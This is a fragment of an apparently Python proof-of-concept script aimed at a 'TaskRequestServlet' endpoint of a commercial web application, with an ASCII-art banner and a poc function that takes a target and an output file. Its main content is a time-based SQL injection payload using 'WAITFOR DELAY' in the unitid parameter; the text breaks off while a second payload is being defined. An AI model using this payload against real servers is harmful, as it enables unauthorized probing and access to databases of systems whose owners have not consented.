...
def banner():
    test = """
 _____          _      __                            _   __                 _      _    
/__   \__ _ ___| | __ /__\ ___  __ _ _   _  ___  ___| |_/ _\ ___ _ ____   _| | ___| |_  
  / /\/ _` / __| |/ // \/// _ \/ _` | | | |/ _ \/ __| __\ \ / _ \ '__\ \ / / |/ _ \ __| 
 / / | (_| \__ \   </ _  \  __/ (_| | |_| |  __/\__ \ |__\ \  __/ |   \ V /| |  __/ |_  
 \/   \__,_|___/_|\_\/ \_/\___|\__, |\__,_|\___||___/\__\__/\___|_|    \_/ |_|\___|\__| 
                                  |_|                                                   """
    print(test)
...
def poc(target, output_file):
    ...
    # 定义payload
    payload_sleep = "/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1';WAITFOR DELAY '0:0:5'--&password=1,"
    payload_normal = (
